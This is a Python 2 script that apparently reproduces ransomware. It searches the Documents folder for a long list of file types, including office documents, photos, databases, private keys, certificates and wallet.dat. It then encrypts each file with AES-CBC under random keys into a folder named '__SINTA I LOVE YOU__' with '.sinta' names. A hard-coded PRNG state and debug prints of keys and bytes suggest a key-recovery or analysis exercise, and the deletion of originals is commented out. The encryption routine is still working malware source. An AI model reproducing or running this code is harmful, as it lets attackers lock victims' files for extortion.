import os, fnmatch, struct, random, string, base64, platform, sys, time, socket, json, urllib, ctypes, urllib2
from Crypto import Random
from Crypto.Cipher import AES

random.setstate((3, (2659254809L, 1435467265L, 4130692464L, 3299781609L, 3934205303L, 2119523272L, 3540327932L, 3713294141L, 940854100L, 1276379259L, 308461927L, 532917772L, 3016399763L, 995926541L, 3335490375L, 1641472250L, 1129194635L, 1543207589L, 1509882922L, 891290633L, 120220892L, 1542100139L, 140320015L, 1646816155L, 579884861L, 955147570L, 1733600186L, 1107533770L, 3719962690L, 2281680385L, 3918120033L, 3025420814L, 905903711L, 4092827060L, 1986829981L, 1330866555L, 1390807481L, 1896448773L, 403122461L, 3391221407L, 805512543L, 2066049188L, 3427551430L, 2961648488L, 650067632L, 1404406250L, 642204491L, 656786234L, 724267271L, 1783580776L, 1295287202L, 2377772845L, 2618551307L, 3602273261L, 1752005479L, 4218597116L, 457480191L, 759569930L, 860664422L, 2347997371L, 511922160L, 2378412457L, 3252216480L, 4035600411L, 1627061019L, 4064530079L, 975877014L, 1002393039L, 1309651046L, 1009244711L, 3012061757L, 1538567259L, 4185027187L, 459128903L, 851036826L, 75860935L, 1941357971L, 2451766229L, 385554729L, 1139036048L, 39762029L, 2156452953L, 3601074950L, 3503199611L, 1975477214L, 981603677L, 1194461829L, 4140779055L, 2346152551L, 484567622L, 3849895928L, 2119795346L, 4268874898L, 3772450465L, 1598259854L, 1972559658L, 3673237996L, 4160112642L, 1956271299L, 523242151L, 2040348036L, 2086868965L, 2764791966L, 3911941091L, 758344199L, 3586561866L, 192136512L, 826184201L, 312381208L, 2930464460L, 323316500L, 4286988570L, 4123947324L, 1235987060L, 4026514143L, 2262035671L, 2459320824L, 4018732066L, 3386090672L, 3971331034L, 2488596074L, 2289478369L, 2170282936L, 3373739191L, 4215658841L, 1698739105L, 2140925706L, 265855366L, 2725303482L, 3257246785L, 3066243907L, 720734942L, 2263632127L, 2223917355L, 222265615L, 2194795321L, 4146687595L, 3047815250L, 2497378041L, 2235663952L, 3086805879L, 4206741846L, 1658180680L, 1214378316L, 795319640L, 3239343253L, 3945332935L, 914648476L, 305372219L, 3658918008L, 1056601318L, 3318591384L, 2827575187L, 2717620677L, 4073248610L, 1565489627L, 2801202290L, 4268036193L, 3117588654L, 650296191L, 4207258320L, 3579320933L, 4125405806L, 1440666424L, 1342670430L, 2953601656L, 2545136888L, 3244680940L, 1622706525L, 1761643102L, 3653410126L, 3043259752L, 730963915L, 696442067L, 2837006545L, 294350059L, 3321547149L, 2691625504L, 2307738302L, 495468549L, 168053813L, 959000716L, 1295746149L, 246041760L, 1679897926L, 4014678579L, 4139165676L, 2136095257L, 1749202663L, 3650703457L, 2295489525L, 1892106519L, 2821118929L, 461314560L, 883840190L, 239191207L, 949736978L, 4021853536L, 1147367770L, 4156430871L, 3900956560L, 1283758288L, 3436399340L, 1901484268L, 1016306470L, 2101303975L, 1432086293L, 1416183844L, 716880767L, 2880760416L, 3031547417L, 2655385897L, 3355949221L, 970084080L, 521843477L, 3813016354L, 2890542040L, 2074084421L, 1071477956L, 1775494503L, 4180251307L, 588987148L, 2684612147L, 1736963422L, 3753554928L, 59554694L, 3832115719L, 2565599431L, 1628207636L, 3811834910L, 1602046448L, 1103946798L, 2297403125L, 3792432454L, 2239644202L, 2158585768L, 83932490L, 4204876101L, 133387008L, 1983938729L, 1660205029L, 774920134L, 1574671683L, 2588416510L, 2769404884L, 3437213714L, 1090935057L, 1493964313L, 596251443L, 1984118404L, 429796666L, 2867024113L, 3221945668L, 686781830L, 4032954668L, 1567163683L, 295141604L, 2903905315L, 363059584L, 2151023865L, 2037840301L, 1293886036L, 3541173686L, 3314211144L, 2292830619L, 995526188L, 1771554949L, 3717751297L, 2933402497L, 1551847319L, 1038926334L, 264978606L, 3751749996L, 2383569082L, 67292646L, 1719402305L, 3993898961L, 2371179685L, 881304228L, 2666827561L, 1749276014L, 1015983310L, 4204245632L, 3297603446L, 3114532941L, 3830220705L, 510730561L, 1941975276L, 3874820636L, 4243271549L, 1387397713L, 62728676L, 2321999074L, 2475806418L, 1034366064L, 535340376L, 2574496236L, 1411055380L, 3040677358L, 3252399498L, 3952899640L, 3397038711L, 1756518984L, 957311714L, 2959197365L, 727256557L, 793513568L, 2541695632L, 1809378780L, 1838925401L, 23061248L, 4155341254L, 1353462037L, 3817618560L, 1940861101L, 1095804879L, 3265124395L, 1971860587L, 520351296L, 4074087621L, 3194625734L, 78384306L, 3441901987L, 1258675320L, 2092690513L, 1071196971L, 407881984L, 1236155148L, 2408351806L, 3198526281L, 391718102L, 1645947424L, 731728802L, 2225920452L, 2743813323L, 1670806134L, 1244520725L, 2547495463L, 2364648932L, 762868223L, 44763147L, 2834429595L, 4252383621L, 4229737049L, 3126820989L, 3755786976L, 1533387770L, 1342326689L, 2033476484L, 4197598240L, 1631102463L, 121415462L, 191980323L, 1448934168L, 1745320209L, 3247346515L, 1897981258L, 4156098221L, 943848906L, 1547299582L, 730177022L, 2164861634L, 1907522948L, 1544372489L, 960638439L, 2505806623L, 2239791672L, 3135106153L, 3381011486L, 1296468978L, 132373285L, 1581615701L, 4255234716L, 741709323L, 252235524L, 1137606318L, 2886482864L, 1599867320L, 2872728345L, 2851182695L, 3533001500L, 4175114981L, 2033123405L, 4001816593L, 4134848943L, 979609904L, 1236654131L, 1767498680L, 2170666725L, 1504230075L, 4108665355L, 415562327L, 3600038685L, 295514909L, 1551796657L, 4178616994L, 3362084477L, 3650531664L, 1086768005L, 2626120434L, 3308886141L, 2116520859L, 1498908870L, 1463120649L, 1206133912L, 4210782047L, 3413037601L, 1137996036L, 1155701147L, 1794830382L, 1618915115L, 694871492L, 2509130712L, 1066586375L, 1132010942L, 3514930511L, 1780493133L, 838231671L, 163225111L, 2386720945L, 1304657159L, 4134662213L, 1027337770L, 834968123L, 4106826732L, 439863468L, 3238278580L, 715535134L, 2908612648L, 2083371875L, 4212384604L, 794649550L, 2222562972L, 74594244L, 359681839L, 1940594093L, 2726828710L, 3020048244L, 1083767581L, 1465603414L, 1449737484L, 1508114966L, 72250940L, 3160631558L, 438184973L, 1393889083L, 1185543589L, 2688236901L, 2566403895L, 2472955848L, 110576431L, 2576820729L, 333321917L, 2172336413L, 3549038040L, 3065632055L, 450719498L, 756213118L, 2337253728L, 3708922524L, 2373953684L, 4057419736L, 3056977039L, 2057816931L, 90705407L, 1277270369L, 382583308L, 3925988542L, 2485366302L, 1936062969L, 895148927L, 864488624L, 1431064696L, 2584114999L, 2416231917L, 282074052L, 3852820324L, 710867661L, 1539049838L, 4236658730L, 3088019418L, 839271324L, 2518064416L, 1495945987L, 2768518728L, 3691048608L, 2921026694L, 3244776652L, 3450496193L, 354250757L, 3374716472L, 3393264797L, 4161679459L, 3265017271L, 941934300L, 3016478018L, 1309070313L, 1050741419L, 2869451713L, 3488467845L, 608773896L, 2441005039L, 867459475L, 1029058097L, 1353122702L, 3691400956L, 2113691625L, 3726533803L, 1818863119L, 164717140L, 485120199L, 3892582772L, 1144702155L, 162277405L, 2444402209L, 461067218L, 2687799471L, 285007966L, 4100644420L, 4070579977L, 635557629L, 2694554132L, 2762886169L, 2730932397L, 2269326565L, 1412056895L, 3659633498L, 865303629L, 2065448048L, 1099494273L, 1648993960L, 510892172L, 1625034828L, 608744777L, 3404572301L, 1260871290L, 2230868114L, 2640981089L, 619327782L, 3369696098L, 2557822866L, 4079997500L, 2629954408L, 88376075L, 85976891L, 643541430L, 2169425492L, 913857176L, 1426930898L, 1522789517L, 3846723747L, 2843942705L, 3459994076L, 434674113L, 2165910386L, 3936436633L, 3346271737L, 1772898842L, 2974908795L, 187263727L, 2089444971L, 823097352L, 879780652L, 2671324974L, 492596044L, 1502558402L, 41598002L, 2764402278L, 3229475355L, 111235253L, 3084798342L, 1252141718L, 1964844232L, 2167615439L, 2940123288L, 514091648L, 1981688883L, 37772991L, 788085739L, 2988875685L, 4132251655L, 2694096322L, 1096906258L, 3999769879L, 1270402969L, 2970315726L, 3413427710L, 1831817082L, 3517804396L, 849498820L, 1486130521L, 1606971359L, 1730332093L, 342449432L, 455323702L, 843777872L, 61720674L, 2699110115L, 401492759L, 1917532632L, 3649825484L, 3220217599L, 1234382433L, 689297391L, 2274627605L, 818297688L, 1197257745L, 2377820872L, 3635058895L, 24424624L, 4248736094L, 1909889864L, 3257348004L, 885113544L, 3618256124L, 1585267265L, 814644034L, 4572061L, 1370541963L, 3547595141L, 3419420653L, 3744413858L, 2871063299L, 1580033966L, 624L), None))


encfolder = '__SINTA I LOVE YOU__'
newextns = 'sinta'

def find_files(root_dir):
    #write_instruction(root_dir, 'md')
    extentions = ['*.txt',
     '*.exe',
     '*.php',
     '*.pl',
     '*.7z',
     '*.rar',
     '*.m4a',
     '*.wma',
     '*.avi',
     '*.wmv',
     '*.csv',
     '*.d3dbsp',
     '*.sc2save',
     '*.sie',
     '*.sum',
     '*.ibank',
     '*.t13',
     '*.t12',
     '*.qdf',
     '*.gdb',
     '*.tax',
     '*.pkpass',
     '*.bc6',
     '*.bc7',
     '*.bkp',
     '*.qic',
     '*.bkf',
     '*.sidn',
     '*.sidd',
     '*.mddata',
     '*.itl',
     '*.itdb',
     '*.icxs',
     '*.hvpl',
     '*.hplg',
     '*.hkdb',
     '*.mdbackup',
     '*.syncdb',
     '*.gho',
     '*.cas',
     '*.svg',
     '*.map',
     '*.wmo',
     '*.itm',
     '*.sb',
     '*.fos',
     '*.mcgame',
     '*.vdf',
     '*.ztmp',
     '*.sis',
     '*.sid',
     '*.ncf',
     '*.menu',
     '*.layout',
     '*.dmp',
     '*.blob',
     '*.esm',
     '*.001',
     '*.vtf',
     '*.dazip',
     '*.fpk',
     '*.mlx',
     '*.kf',
     '*.iwd',
     '*.vpk',
     '*.tor',
     '*.psk',
     '*.rim',
     '*.w3x',
     '*.fsh',
     '*.ntl',
     '*.arch00',
     '*.lvl',
     '*.snx',
     '*.cfr',
     '*.ff',
     '*.vpp_pc',
     '*.lrf',
     '*.m2',
     '*.mcmeta',
     '*.vfs0',
     '*.mpqge',
     '*.kdb',
     '*.db0',
     '*.mp3',
     '*.upx',
     '*.rofl',
     '*.hkx',
     '*.bar',
     '*.upk',
     '*.das',
     '*.iwi',
     '*.litemod',
     '*.asset',
     '*.forge',
     '*.ltx',
     '*.bsa',
     '*.apk',
     '*.re4',
     '*.sav',
     '*.lbf',
     '*.slm',
     '*.bik',
     '*.epk',
     '*.rgss3a',
     '*.pak',
     '*.big',
     '*.unity3d',
     '*.wotreplay',
     '*.xxx',
     '*.desc',
     '*.py',
     '*.m3u',
     '*.flv',
     '*.js',
     '*.css',
     '*.rb',
     '*.png',
     '*.jpeg',
     '*.p7c',
     '*.p7b',
     '*.p12',
     '*.pfx',
     '*.pem',
     '*.crt',
     '*.cer',
     '*.der',
     '*.x3f',
     '*.srw',
     '*.pef',
     '*.ptx',
     '*.r3d',
     '*.rw2',
     '*.rwl',
     '*.raw',
     '*.raf',
     '*.orf',
     '*.nrw',
     '*.mrwref',
     '*.mef',
     '*.erf',
     '*.kdc',
     '*.dcr',
     '*.cr2',
     '*.crw',
     '*.bay',
     '*.sr2',
     '*.srf',
     '*.arw',
     '*.3fr',
     '*.dng',
     '*.jpeg',
     '*.jpg',
     '*.cdr',
     '*.indd',
     '*.ai',
     '*.eps',
     '*.pdf',
     '*.pdd',
     '*.psd',
     '*.dbfv',
     '*.mdf',
     '*.wb2',
     '*.rtf',
     '*.wpd',
     '*.dxg',
     '*.xf',
     '*.dwg',
     '*.pst',
     '*.accdb',
     '*.mdb',
     '*.pptm',
     '*.pptx',
     '*.ppt',
     '*.xlk',
     '*.xlsb',
     '*.xlsm',
     '*.xlsx',
     '*.xls',
     '*.wps',
     '*.docm',
     '*.docx',
     '*.doc',
     '*.odb',
     '*.odc',
     '*.odm',
     '*.odp',
     '*.ods',
     '*.odt',
     '*.sql',
     '*.zip',
     '*.tar',
     '*.tar.gz',
     '*.tgz',
     '*.biz',
     '*.ocx',
     '*.html',
     '*.htm',
     '*.3gp',
     '*.srt',
     '*.cpp',
     '*.mid',
     '*.mkv',
     '*.mov',
     '*.asf',
     '*.mpeg',
     '*.vob',
     '*.mpg',
     '*.fla',
     '*.swf',
     '*.wav',
     '*.qcow2',
     '*.vdi',
     '*.vmdk',
     '*.vmx',
     '*.gpg',
     '*.aes',
     '*.ARC',
     '*.PAQ',
     '*.tar.bz2',
     '*.tbk',
     '*.bak',
     '*.djv',
     '*.djvu',
     '*.bmp',
     '*.cgm',
     '*.tif',
     '*.tiff',
     '*.NEF',
     '*.cmd',
     '*.class',
     '*.jar',
     '*.java',
     '*.asp',
     '*.brd',
     '*.sch',
     '*.dch',
     '*.dip',
     '*.vbs',
     '*.asm',
     '*.pas',
     '*.ldf',
     '*.ibd',
     '*.MYI',
     '*.MYD',
     '*.frm',
     '*.dbf',
     '*.SQLITEDB',
     '*.SQLITE3',
     '*.asc',
     '*.lay6',
     '*.lay',
     '*.ms11 (Security copy)',
     '*.sldm',
     '*.sldx',
     '*.ppsm',
     '*.ppsx',
     '*.ppam',
     '*.docb',
     '*.mml',
     '*.sxm',
     '*.otg',
     '*.slk',
     '*.xlw',
     '*.xlt',
     '*.xlm',
     '*.xlc',
     '*.dif',
     '*.stc',
     '*.sxc',
     '*.ots',
     '*.ods',
     '*.hwp',
     '*.dotm',
     '*.dotx',
     '*.docm',
     '*.DOT',
     '*.max',
     '*.xml',
     '*.uot',
     '*.stw',
     '*.sxw',
     '*.ott',
     '*.csr',
     '*.key',
     'wallet.dat']

    for dirpath, dirs, files in os.walk(root_dir):
        if 'Windows' not in dirpath:
            for basename in files:
                for ext in extentions:
                    if fnmatch.fnmatch(basename, ext):
                        filename = os.path.join(dirpath, basename)
                        yield filename
                        

def text_generator(size = 6, chars = string.ascii_uppercase + string.digits):
    return ''.join((random.choice(chars) for _ in range(size))) + '.' + newextns

def generate_file(file_path, filename):
    make_directory(file_path)
    key = ''.join([ random.choice(string.ascii_letters + string.digits) for n in xrange(32) ])
    print(key)
    newfilename = file_path + '/' + encfolder + '/' + text_generator(36, '1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm')
    try:
        encrypt_file(key, filename, newfilename)
    except:
        pass

def make_directory(file_path):
    directory = file_path + '/' + encfolder

    if not os.path.exists(directory):
        try:
            os.makedirs(directory)
        except:
            pass

def encrypt_file(key, in_filename, newfilename, out_filename = None, chunksize = 65536, Block = 16):
    if not out_filename:
        out_filename = newfilename
    iv = ''.join((chr(random.randint(0, 255)) for i in range(16)))
    print(hex(ord(iv[15])))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                print(hex(ord(chunk[0])))
                x = encryptor.encrypt(chunk)
                outfile.write(x)
                if (len(x) >= 65536):
                    print(hex(ord(x[65535]))+" "+hex(ord(x[65534])))
                print(hex(ord(x[0]))+" "+hex(ord(x[1]))+" "+hex(ord(x[2])))
                
    with open(out_filename, 'rb') as infile:
        x = infile.read(30)
        print("bru "+hex(ord(x[24]))+" "+hex(ord(x[25]))+" "+hex(ord(x[26])))
        
    print(out_filename)


listdir = ["Documents"]

for dir_ in listdir:
    for filename in find_files(dir_):
        print(filename)
        generate_file(dir_, filename)

        #delete_file(filename)
